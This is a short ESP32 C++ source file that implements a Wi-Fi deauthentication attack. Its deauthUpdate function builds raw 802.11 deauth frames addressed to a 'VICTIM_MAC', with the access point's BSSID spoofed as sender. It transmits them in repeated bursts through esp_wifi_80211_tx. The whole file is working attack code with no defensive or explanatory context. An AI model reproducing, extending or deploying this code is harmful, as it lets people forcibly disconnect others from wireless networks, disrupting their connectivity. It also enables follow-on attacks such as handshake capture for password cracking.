#include "deauth_utils.h"
#include <WiFi.h>
#include <esp_wifi.h>

extern uint8_t g_esp32_mac[6];
extern uint8_t g_bssid[6];
extern uint8_t VICTIM_MAC[6];
extern int deauthCount;

static bool deauthRunning = false;
static unsigned long lastDeauth = 0;
static int deauthBurst = 10;

void deauthStart() { deauthRunning = true; }
void deauthStop() { deauthRunning = false; }

void deauthUpdate() {
    if (!deauthRunning) return;
    unsigned long now = millis();
    if (now - lastDeauth < 1000) return;
    lastDeauth = now;
    for (int i = 0; i < deauthBurst; i++) {
        uint8_t frame[26];
        frame[0] = 0xC0; frame[1] = 0x00;
        frame[2] = 0x00; frame[3] = 0x00;
        memcpy(&frame[4], VICTIM_MAC, 6);
        memcpy(&frame[10], g_bssid, 6);
        memcpy(&frame[16], g_bssid, 6);
        frame[22] = 0x00; frame[23] = 0x00;
        frame[24] = 0x07; frame[25] = 0x00;
        esp_wifi_80211_tx(WIFI_IF_STA, frame, 26, true);
        deauthCount++;  // FIX: increment counter
        delay(5);
    }
}
